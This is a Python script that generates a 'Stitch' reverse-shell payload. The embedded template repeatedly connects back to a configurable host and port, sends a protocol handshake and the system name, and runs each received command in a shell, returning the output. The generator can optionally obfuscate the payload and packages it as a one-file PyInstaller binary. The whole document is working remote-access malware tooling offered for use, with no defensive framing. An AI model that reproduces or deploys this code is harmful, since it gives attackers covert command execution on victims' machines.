#!/usr/bin/env python3
"""
Fixed payload generator that creates working payloads
"""

import os
import tempfile
import subprocess
from pathlib import Path

def generate_working_payload(config):
    """Generate a payload that actually works"""
    
    host = config.get('host', '127.0.0.1')
    port = config.get('port', '4040')
    platform = config.get('platform', 'linux')
    obfuscate = config.get('obfuscate', False)
    
    # Use the working template
    payload_code = """#!/usr/bin/env python3
import socket
import subprocess
import time
import sys
import os
import struct
import base64

class StitchPayload:
    def __init__(self):
        self.host = '%s'
        self.port = %s
        
    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect((self.host, self.port))
                return True
            except Exception:
                time.sleep(5)
                
    def send_info(self):
        # Send Stitch protocol handshake
        self.sock.send(base64.b64encode(b'stitch_shell') + b'\\n')
        self.sock.send(b'default\\n')
        
        import platform
        self.sock.send(platform.system().encode() + b'\\n')
        
    def command_loop(self):
        while True:
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                    
                cmd = data.decode().strip()
                
                if cmd == 'exit':
                    break
                else:
                    try:
                        output = subprocess.check_output(cmd, shell=True, timeout=10).decode()
                    except Exception:
                        output = "Error"
                        
                self.sock.send(output.encode())
                
            except Exception:
                break
                
        self.sock.close()
        
    def run(self):
        if self.connect():
            self.send_info()
            self.command_loop()

if __name__ == "__main__":
    StitchPayload().run()
""" % (host, port)
    
    # Save to temp file
    temp_dir = tempfile.mkdtemp(prefix='stitch_payload_')
    payload_path = os.path.join(temp_dir, 'payload.py')
    
    with open(payload_path, 'w') as f:
        f.write(payload_code)
        
    # If obfuscate requested
    if obfuscate:
        try:
            import payload_obfuscator
            payload_obfuscator.obfuscate_file(payload_path, payload_path)
        except Exception:
            pass
            
    # Try to compile to binary
    if platform == 'linux':
        try:
            # Create simple spec file
            spec_content = """
# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['%s'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['socket', 'subprocess', 'platform', 'base64', 'struct'],
    hookspath=[],
    runtime_hooks=[],
    excludes=['tkinter'],
    noarchive=False,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='payload',
    debug=False,
    strip=False,
    upx=False,
    console=True,
    onefile=True
)
""" % payload_path
            
            spec_path = os.path.join(temp_dir, 'payload.spec')
            with open(spec_path, 'w') as f:
                f.write(spec_content)
                
            # Run PyInstaller
            result = subprocess.run(
                ['pyinstaller', '--clean', '--noconfirm', spec_path],
                cwd=temp_dir,
                capture_output=True,
                timeout=30
            )
            
            # Check for binary
            binary_path = os.path.join(temp_dir, 'dist', 'payload')
            if os.path.exists(binary_path):
                return binary_path
                
        except Exception as e:
            print(f"Binary compilation failed: {e}")
            
    # Return Python script as fallback
    return payload_path
